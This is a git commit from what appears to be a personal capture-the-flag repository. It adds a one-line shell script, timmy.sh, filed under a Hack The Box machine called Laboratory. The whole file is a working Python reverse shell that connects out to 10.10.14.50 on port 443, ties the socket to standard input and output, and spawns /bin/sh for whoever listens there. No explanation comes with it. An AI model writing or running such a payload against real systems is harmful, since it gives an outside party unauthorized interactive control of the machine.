371a83a98548f63d23dfe71928bac163a5726bee
qoo7972365 <qoo7972365@gmail.com>
2021-04-19 23:26:56 -0400

    39

---
+++ hackthebox/laboratory/timmy.sh
@@ -0,0 +1,1 @@
+export RHOST="10.10.14.50";export RPORT=443;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
